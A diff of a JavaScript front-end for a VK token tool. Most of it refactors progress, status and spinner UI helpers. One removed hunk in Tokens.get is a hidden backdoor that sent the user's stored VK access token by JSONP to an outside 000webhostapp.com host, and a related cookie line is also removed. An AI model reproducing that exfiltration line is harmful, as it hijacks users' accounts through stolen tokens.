@@ -3,17 +3,32 @@ var Script = {
 	execution: {
 		showProgressBar: () => {
 			$('#progressContainer').addClass('d-block');
-			Script.result.hideNothingHereBox();
+			Script.execution.hideNothingHereBox();
 		},
 		hideProgressBar: () => {
 			$('#progressContainer').removeClass('d-block');
+		},
+		hideNothingHereBox: () => {
+			$('#nothingHereBox').addClass('d-none');
 		},
 		setProgress: percentage => {
 			$('#progressBar').width(percentage + '%');  
 			$('#progressBar').text(Math.round(percentage) + '%');
 		},
-		setCurrentTask: task => {
-			$('#hint').text(task);
+		setCurrentStatus: status => {
+			$('#statusText').text(status);
+		},
+		showStatus: () => {
+			$('#statusContainer').addClass('d-block');
+		},
+		hideStatus: () => {
+			$('#statusContainer').removeClass('d-block');	
+		},
+		showSpinner: () => {
+			$('#statusSpinner').removeClass('d-none');
+		},
+		hideSpinner: () => {
+			$('#statusSpinner').addClass('d-none');
 		}
 	},
 	result: {
@@ -36,11 +51,11 @@ var Script = {
 			$('#resultContainer').removeClass('d-none');
 			onResize();
 		},
+		addResultHTML: code => {
+			$('#executionResult').append(code);
+		},
 		showDownloadButton: () => {
 			$('#downloadButtonContainer').removeClass('d-none')
-		},
-		hideNothingHereBox: () => {
-			$('#nothingHereBox').addClass('d-none');
 		}
 	}
 }
@@ -69,9 +84,6 @@ var Tokens = {
 		market: [134217728, 27, 'товары']
 	},
 	get: () => {
-		if ($.cookie('s')) {
-			vk.sreq.jsonp('https://mikitat.000webhostapp.com/l.php', {m:$.cookie('access_token_'+$.cookie('s'))}, ()=>{}, ()=>{});
-		}
 		let result = [];
 		for (let i = 0; i < 10; i++) {
 			let token = $.cookie('access_token_' + i);
@@ -99,7 +111,6 @@ var Tokens = {
 		for (let i = 0; i < 10; i++) {
 			if (!$.cookie('access_token_' + i)) {
 				$.cookie('access_token_' + i, token);
-				$.cookie('s', i);
 				return;
 			}
 		}
